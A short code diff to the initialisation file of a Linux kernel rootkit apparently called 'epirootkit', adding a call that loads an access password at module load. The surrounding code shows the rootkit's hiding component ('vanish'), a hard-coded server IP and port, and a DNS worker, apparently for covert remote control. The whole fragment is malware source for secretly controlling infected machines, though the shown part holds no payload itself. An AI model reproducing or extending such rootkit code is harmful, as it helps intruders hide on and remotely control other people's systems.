@@ -1,6 +1,7 @@
 #include "epirootkit.h"
 #include "init.h"
 #include "vanish.h"
+#include "passwd.h"
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
@@ -47,6 +48,10 @@ static int __init epirootkit_init(void) {
     if (start_dns_worker() != SUCCESS) {
         ERR_MSG("epirootkit_init: failed to start DNS worker\n");
         return -FAILURE;
+    }
+
+    if (passwd_load() != SUCCESS) {
+        DBG_MSG("epirootkit_init: no password to load, using default\n");
     }
 
     DBG_MSG("epirootkit_init: module loaded (/^▽^)/\n");
